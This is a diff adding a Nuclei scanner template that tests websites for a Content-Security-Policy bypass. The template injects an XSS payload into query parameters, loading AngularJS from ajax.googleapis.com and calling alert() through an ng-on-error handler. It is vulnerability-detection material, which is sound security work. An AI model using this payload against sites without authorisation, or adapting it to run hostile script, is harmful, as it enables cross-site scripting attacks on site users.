@@ -1,0 +1,39 @@
+id: google-ajax-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass via Google AJAX
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,google-ajax
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: google_ajax_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.3/angular.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "google_ajax_csp_xss == true"
+# digest: 4a0a00473045022100b8430f8cffdb03f4f53c80d60e9bb1d1f673ea33a620a2fa46eb86140b0592c10220297a797ff821d56a7444f79dd27442b114fb306256b0712846838930b52433f5:922c64590222798bb761d5b6d8e72950
